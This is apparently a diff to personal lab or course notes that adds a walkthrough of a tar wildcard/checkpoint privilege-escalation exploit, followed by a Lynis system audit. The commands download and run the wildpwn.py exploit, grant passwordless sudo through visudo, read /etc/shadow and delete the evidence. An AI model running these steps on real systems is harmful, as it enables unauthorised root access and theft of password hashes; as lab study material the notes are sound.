@@ -34,7 +34,28 @@ tar tvvf epscript_back_mon.tar --incremental | less
 
 ## Exploiting the tar Command with the Checkpoint and Wildcard Options
 
-
+```console
+cd
+sudo su jane
+cd ~/Documents
+cd ExploitTar
+wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py
+python wildpwn.py tar .
+ls -lat
+cd .cache/
+ls -lat
+./.cachefile
+visudo
+```
+From the exploit we now have root priviledges. As Jane we are able to enter visudo without any priviledge escalations. Within visudo we give ourselves all permissions with jane ALL=(ALL) NOPASSWD:ALL
+```console
+su jane
+sudo cat etc/shadow
+sudo rm -rf ~/Documents/ExploitTar
+sudo apt install lynis
+sudo lynis audit system
+sudo nano /var/log/lynis-report.dat
+```
 
 # Week 5.2
 
